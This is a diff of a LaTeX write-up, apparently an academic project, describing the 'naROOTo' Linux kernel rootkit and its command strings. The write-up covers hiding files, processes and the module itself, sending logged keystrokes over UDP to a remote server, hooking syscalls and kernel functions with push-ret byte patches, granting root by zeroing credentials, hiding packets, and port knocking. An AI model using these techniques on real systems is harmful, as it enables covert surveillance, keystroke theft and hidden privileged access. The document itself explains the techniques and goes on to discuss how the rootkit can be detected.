@@ -120,7 +120,10 @@ The following table \ref{tab:commands} lists all commands with a short descripti
 \multicolumn{2}{ |c|}{Network keylogging} \\
 \hline
 \texttt{f7R\_enable\_net\_keylog\textvisiblespace<ip>;} & Enables network keylogging. \\ & \texttt{<ip>} specifies the IP address of the syslog-ng server. \\
-\texttt{f7R\_disable\_net\_keylog;} & Disabled network keylogging. \\ \hline
+\texttt{f7R\_disable\_net\_keylog;} & Disables network keylogging. \\
+ & \\
+\texttt{f7R\_enable\_filelog;} & Enables local keylogging. \\
+\texttt{f7R\_disable\_filelog;} & Disables local keylogging. \\ \hline
 
 \multicolumn{2}{ |c| }{Privilege escalation} \\
 \hline
@@ -231,8 +234,13 @@ static void enable_page_protection(void) {
 
 \subsection{File hiding}
 To hide files, \texttt{naROOTo} uses a manipulated \texttt{getdents} system call.
-The manipulated function calls the original to get its output.
-This output is then scanned for files or folders that need to be hidden.
+
+\begin{verbatim}
+int getdents(unsigned int fd, struct linux\_dirent *dirp,
+                    unsigned int count);
+\end{verbatim}
+
+The manipulated function calls the original to get its output which is then scanned for files or folders that need to be hidden.
 Each file is represented by a \texttt{struct linux\_dirent} which contains additional information like its name.
 If it is decided that a file is supposed to be hidden, the memory of the following \texttt{linux\_dirent}s is moved forward (overwriting that entry) and the return value is adapted accordingly.
 This way the entry is no longer visible to the user space process that called \texttt{getdents}.
@@ -259,116 +267,76 @@ To hide processes, \texttt{naROOTo} uses the already implemented file hiding.
 This is possible because tools like \texttt{ps} look at the \texttt{/proc}-filesystem which contains a subfolder for each process.
 All that is left to implement is to check if the current folder matches \texttt{/proc} (which can be done by looking at the file descriptor \texttt{fd}) and if the file name matches a PID of a hidden process. If both is the case, the file is hidden and tools like \texttt{ps} will no longer display it.
 
-\begin{verbatim}
-int getdents(unsigned int fd, struct linux\_dirent *dirp,
-                    unsigned int count);
-\end{verbatim}
-
 \subsection{Module hiding}
-We can get the information on loaded modules using \texttt{lsmod}
-(which lists the entries from \texttt{/proc/modules}) and entries in \texttt{/sys/modules}
+A user can display all currently loaded modules by issuing the command \texttt{lsmod} (which lists the entries from \texttt{/proc/modules}) and \texttt{/sys/modules}
 
-\texttt{Hiding the module from /proc/modules}: All the modules in the kernel are arranged as linked list, 
-where each list of type \texttt{struct module}. \texttt{THIS\_MODULE} macro which points to the current module. 
-To hide it from lsmod we just need to delete the particular entry from the list of modules. 
-This can be easily achieved via list operations defined in \texttt{list.h}:\texttt{list\_del}, 
-\texttt{list\_add\_tail}, \texttt{list\_add}. Once removed from the list of modules, 
-it will not show up anymore when using \texttt{lsmod}. 
+In the kernel, all modules are arranged as a linked list, where each item is of type \texttt{struct module}.
+Furthermore they are stored in a \texttt{struct kernfs\_node} which is an implementation of a red-blacktree.
+To hide a module from \texttt{lsmod} we need to delete its entry from the list of modules from both sources. 
+This can be easily achieved by using the list operations defined in \texttt{list.h} and the red-black tree operations defined in \texttt{rbtree.h}.
+Once removed from the list of modules and the kernfs tree, it will not be shown to user space anymore.
+This also means that one cannot remove it using \texttt{rmmod} while its hidden.
 
-\texttt{Hiding the module from /sys/modules}: Deleting from \texttt{/sys/modules} was a tricky part. 
-Just deleting from the list of modules, will not stop showing it up from \texttt{/sys/modules}.
-This we can do by two different methods. By hacking the \texttt{filldir} function or by deleting it from the 
-kernel file system. If we do this by using first method \texttt{naROOTo} will be easily detectable. 
-% add how: One can count the number of modules from 
-So we decided to delete the entry from the kernel file system. \texttt{THIS\_MODULE} points to kernel object. 
-If we delete this kernel object of type \texttt{struct kernfs\_node}, then it will not show up from from \texttt{/sys/modules}. 
-In recent versions of kernel, the kernel objects are implemented as red-black trees. 
-There are functions defined in \texttt{rbtree.h} to perform this operation. 
+To unhide a module, we just have to reinsert it in the data structures.
 
-\begin{verbatim}
-rb_erase(&kn->rb, &kn->parent->dir.children);
-RB_CLEAR_NODE(&kn->rb);
-\end{verbatim}
+\subsection{Keylogging}
+Implementing local keylogging is very straight forward.
+We just need to hook the \texttt{read} system call and write all characters entered into \texttt{stdin} to a file. 
 
-%TODO: gmc: add details about removing kernfs\_node. 
+For remote keylogging we just send \texttt{UDP} packets containing the keystrokes using the \texttt{netpoll} kernel API to a remote location. 
+The only constraint is that netpoll can only send packets via an ethernet interface, not a wireless one. 
 
-\subsection{Network Key-logging}
-We had the local key-logging already enabled in our root-kit by hooking \texttt{read} system call. 
-We just had to send this keys to \texttt{syslog-ng} server, using syslog protocol. 
-These packets can be sent using \texttt{UDP} packets using \texttt{netpoll} kernel API. 
-The \texttt{netpoll.h} provides the mechanism for sending UDP packets to a remote host. 
-Only one constraint in netpoll is that, the destination port has to be a Ethernet port. 
-
-To do this function, we need to first initialize the netpoll structure with IP address, port number etc. 
-before using it to send the keys. 
-The \texttt{netpoll} structure looks like this, 
+First, we need to initialize the netpoll structure with remote and local IP addresses, ports and some further configuration. 
+The \texttt{netpoll} structure looks like this:
 
 \begin{verbatim}
   struct netpoll {
           struct net_device *dev;
-          char dev_name[IFNAMSIZ]; // device name has to be ethernet
-          const char *name; 
-  
-          union inet_addr local_ip, remote_ip;	// Ip addresses in network byte order
+          char dev_name[IFNAMSIZ];		/* the network device used */
+          const char *name; 			
+          union inet_addr local_ip, remote_ip;	/* local and remote ip address
+								in network byte order */
           bool ipv6; 
-          u16 local_port, remote_port; // some unused local port(eg. 6666) and 
-				      //remote_port = 514 (for syslog-ng server)
-          u8 remote_mac[ETH_ALEN]; // set to 0xff
+          u16 local_port, remote_port; 		/* local and remote port */
+          u8 remote_mac[ETH_ALEN];		/* set to broadcast */
   
           struct work_struct cleanup_work;
   };
 \end{verbatim}
 
-Once the structre is initialized, we call,
+Any valid IPv4 address can be chosen for the local address. Once the structure is initialized, we call 
+
 \begin{verbatim}
 int netpoll_setup(struct netpoll *);
 \end{verbatim} 
 
-This function sets up everything needed for sending the keys. Now we need take the input keys, 
-add the pid information of the terminal and send the keys using \texttt{netpoll\_send\_UDP} which looks like,
+This function sets up everything needed for sending UDP packets. 
+Now the following function can be used to send the keystrokes combined with the process ID to the remove server.
 
 \begin{verbatim}
 netpoll_send_UDP(np, sned_buf, send_len); 
 \end{verbatim}
 
-\texttt{Getting the PID information}: This was quite simple, as the \texttt{current} macro was quite handy in this situation.
-\texttt{current} macro points to the \texttt{task\_struct} of the currently executing process. 
-\texttt{task\_struct} has the \texttt{pid} member. 
+\subsection{Command and control}
+The command and control interface also uses the hooked \texttt{read} system call.
+For each keystroke the function \texttt{accept\_input(char * input)} is called.
+To parse the commands, a state machine is being used.
+First, it is checked for the char sequence \texttt{f7R\_}.
+If this is detected, the state is changed to command enter mode.
+As soon as a space character is entered, the state switches to parameter enter mode.
+When a semicolon character is entered, the module tries to execute the command.
 
-
-\texttt{Setting up syslog-ng server}: One must set the \texttt{syslog-ng} server in the destination. 
-The following steps are for setting the syslog-ng server on Ubuntu. 
-\begin{itemize}
-\item Install the syslog-ng server: sudo apt-get install syslog-ng
-
-\item Add these entries in \texttt{syslog-ng.conf} file (you can find the file under /etc/syslog-ng/ folder)
-\begin{verbatim}
-source syslog_udp {
-udp(port(514));
-};
-destination df_wrt0 {
-file("/var/log/rootkit_log.log");
-};
-log {
-source(syslog_udp);
-destination(df_wrt0);
-}
-filter f_wrt0 {
-host("Ip from you are getting the data");
-};
-log {
-source(syslog_udp);
-filter(f_wrt0);
-destination(df_wrt0);
-}
-\end{verbatim}
-
-\end{itemize}
+To keep track of the different hidden ports, files, processes, etc. a number of linked list is maintained.
+When a new object is supposed to be hidden, it is simply added to the list.
+When it is supposed to be unhidden, it is removed.
+Before the LKM is unloaded, all lists are cleared and their memory is freed to prevent memory leaks.
 
 \subsection{Privilege Escalation}
 To grant superuser privileges to any shell, \texttt{naROOTo} manipulates the credentials of the particular process.
 This is done by setting all ids to 0 in the corresponding \texttt{struct cred}.
 The original values are stored to be able to return to regular privileges if necessary.
+
+The functions used for getting the credentials and writing them are:
 
 \begin{verbatim}
 struct cred * prepare_creds();
@@ -411,48 +379,37 @@ we copy the remaining entries and decrease the length of the original function a
 
 
 \subsection{Packet Hiding}
-Our goal was to hide any network packets from any process which uses libcap to  sniff packets.
-At first we wanted to understand how libcap tools work to sniff packets. \texttt{strace} on tcpdump gave us some useful information. It uses packet sockets and then socket is polled every second to retrieve the information.   
+Our goal was to hide network packets from any process which uses libcap to sniff packets.
+It uses packet sockets and then polls them every second to retrieve the information.   
 
 \begin{verbatim}
-socket(PF_PACKET, SOCK_RAW, 768)        = 3
-poll([{fd=3, events=POLLIN}], 1, 1000)  = 0 (Timeout)
+socket(PF_PACKET, SOCK_RAW, 768) = 3
+poll([{fd=3, events=POLLIN}], 1, 1000) = 0 (Timeout)
 \end{verbatim} 
 
-Some further investigations of libcap lead us to understand that, these three functions are involved in getting the packet information.\texttt{packet\_rcv}, \texttt{tpacket\_rcv}, \texttt{packet\_rcv\_spkt}. These functions give the packet information to user space when {\em memory mapped} sockets are used.
+Some further investigations of libcap lead us to understand that three functions are involved in getting the packet information: \texttt{packet\_rcv}, \texttt{tpacket\_rcv}, \texttt{packet\_rcv\_spkt}. These functions provide the packet information to user space.
 
-So we decided to hook the these functions. 
-We use {\em jump code injection} method to hook these functions. This means that we copy (assembly)
-code at the top of the function body which leads to a jump to our (hooked) function. Whenever we need to call
-the original function, we have to overwrite this section with the original code again and do an ordinary call to
-it. We used \texttt{push-ret} method to perform jump. 
-We \texttt{push} the address on top of the stack and issue a \texttt{ret} instruction.
+To hook the these functions we had to use different method as they are not in the system call table. 
+We copy assembly code at the top of the function body which leads to a jump to our manipulated function.
+Whenever we need to call the original function we, of course, have to restore this section with the original code.
+We used \texttt{push-ret} method to perform jump: first we \texttt{PUSH} the address of our function on the stack, then we jump to it using a \texttt{RET} instruction.
+This is accomplished by writing the following char array to the beginning of the original function.
+The address part is, of course, replaced with the actual address.
 
 \begin{verbatim}
 char hook[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
 unsigned int *target = (unsigned int *) (hook + 1);
 \end{verbatim} 
 
-In the hooked functions, we call \texttt{is\_packet\_hidden} function with \texttt{struct sk\_buff} as parameter.
-We just extract the ip header from \texttt{sk\_buff} and check if we want to hide this ip address and return the values accordingly. 
-If we do not want to hide the packet in the hooked function, we just restore original, call it, hook again. 
+In the hooked functions, we check if we need to hide this packet.
+For this we extract the ip header from \texttt{sk\_buff} and check if we want to hide this ip address and return the values accordingly. 
+If we do not want to hide the packet in the hooked function, we just restore the original, call it, and finally hook it again. 
   
 \subsection{Port Knocking}
-To implement rudimentary port knocking feature, we accept the service that we want to hide and an ip address 
-from which the connections are accepted. To implement this we use Netfilter hooks. Netfilter is a set of hooks inside Linux kernel. 
-It allows kernel modules to register callback functions with the network stack in order to intercept and manipulate the network packet.
-
-The IPv4 packet traversal through Netfilter system is illustrated in figure \ref{netfilter}, 
-\begin{figure*}
-\centerline{
-\includegraphics[width=1.0\columnwidth]{netfilter.jpg}
-}
-\caption{Netfilter System hook}
-% A label to allow refering to this figure in the text.
-\label{netfilter}
-\end{figure*}
-
-When a network packet comes in, it is passed to the netfilter’s first hook \texttt{NF\_INET\_PRE\_ROUTING}. After that, the packet goes through the routing code, which decides where the packet is destined to, either another port in same network interface or another interface. It also might drop the packet if it’s unroutable. So we hook netfilter function like below. 
+To implement port knocking, we used the Netfilter API of the kernel.
+This is also used by programs like \texttt{iptables} and is well documented.
+This API works by providing hook points for custom functions that do the filtering.
+To set this up, we had to specify a few things:
 
 \begin{verbatim}
         /* setup everything for the netfilter hook */
@@ -465,7 +422,17 @@ When a network packet comes in, it is passed to the netfilter’s first hook \te
         ret = nf_register_hook(&hook);
 \end{verbatim} 
 
-And in the hooked function, we extract the ip header from \texttt{sk\_buff} and check if the port is blocked, depending on that we then craft an appropriate \texttt{REJECT} response. For TCP we send \texttt{TCP RST} and for UDP we send icmp port unreachable. If the port is allowed to connect we send \texttt{NF\_ACCEPT} to allow the connection.
+\texttt{knocking\_hook} is the name of our function that does the filtering. It is getting called whenever a packet is detected. \texttt{NF\_INET\_LOCAL\_IN} filters just packets that are destined for this machine (not packets that are forwarded). \texttt{PF\_INET} filters just IPv4 traffic. \texttt{NF\_IP\_PRI\_FIRST} means that the filter will be applied first (before all other filters).
+
+What we actually did is to require that a specific port sequence has to be triggered before a remote machine can connect to certain services.
+To implement this, we used the socket buffer of each packet to check it for its port.
+If it matches the list of ports that need to be triggered, a state machine will be updated.
+After all ports have been triggered within a specific time (set to two seconds), the remote machine can connect.
+The port triggering is further configured to only allow one remote machine access at a time.
+If a new machine successfully triggers the port, the old machine will lose access.
+
+If someone tries to connect to the filtered port without correctly triggering first, it will receive either an TCP RST or a ICMP Port Unreachable packet.
+The functionality for this is provided by another part of the Netfilter API: \texttt{net/netfilter/ipv4/nf\_reject.h}.
 
 \section{Vulnerabilities}
 Even though \texttt{naROOTo} utilizes multiple techniques to hide itself, there are still a few weaknesses that allow its detection.
